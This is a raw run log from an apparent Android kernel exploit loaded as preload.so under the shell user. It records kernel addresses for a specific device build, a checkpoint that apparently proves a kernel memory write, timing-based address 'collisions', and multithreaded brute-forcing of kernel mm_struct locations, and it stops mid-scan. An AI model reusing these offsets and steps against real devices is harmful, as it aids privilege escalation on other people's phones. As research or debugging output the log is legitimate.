===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788952225.txt tmp=/data/local/tmp/.temp/log_1788952225.txt pid=14844 uid=2000
1788952225.554 14844 [+] preload starting pid=14844
1788952225.560 14844 [+] startup context pid=14844 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788952225.561 14844 [+] build config pid=14844 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788952225.563 14844 [+] p0 profile pid=14844 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788952225.580 14844 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788952225.583 14844 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=80099c95-953c-4b9b-9486-abd786a01617 (odd: leaked scratch, even: aligned bootid+3)
1788952227.060 14844 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788952229.469 14844 [*] pile-up verified: approx_time=2385
1788952229.477 14844 [*] start finding collisisons
1788952229.478 14844 [*] target    0000007cd32010c8
1788952230.938 14844 [*]   0000006a3ce6c360
1788952231.906 14844 [*]   0000006a3d83c1e0
1788952232.537 14844 [*]   0000006a3dd70b80
1788952233.066 14844 [*]   0000006a3e14fa78
1788952233.395 14844 [*]   0000006a3e1fdfe8
1788952233.844 14844 [*]   0000006a3e4a7538
1788952234.673 14844 [*]   0000006a3ec3d1e8
1788952235.427 14844 [*]   0000006a3f2f87c0
1788952236.254 14844 [*]   0000006a3faa8540
1788952237.123 14844 [*]   0000006a40305828
1788952237.607 14844 [*]   0000006a40640200
1788952238.701 14844 [*]   0000006a411d2e90
1788952239.400 14844 [*]   0000006a417e9f48
1788952239.827 14844 [*]   0000006a41a66330
1788952240.233 14844 [*]   0000006a41c964b0
1788952240.237 14844 [*] found 15 collisisons
1788952241.382 14844 [*] start bruteforcing
1788952241.391 14844 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788952241.391 14844 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788952241.392 14844 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
1788952241.391 14844 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788952241.391 14844 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788952241.393 14844 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788952241.393 14844 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788952241.393 14844 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788952241.397 14844 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
1788952241.398 14844 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
1788952241.401 14844 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
1788952241.401 14844 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
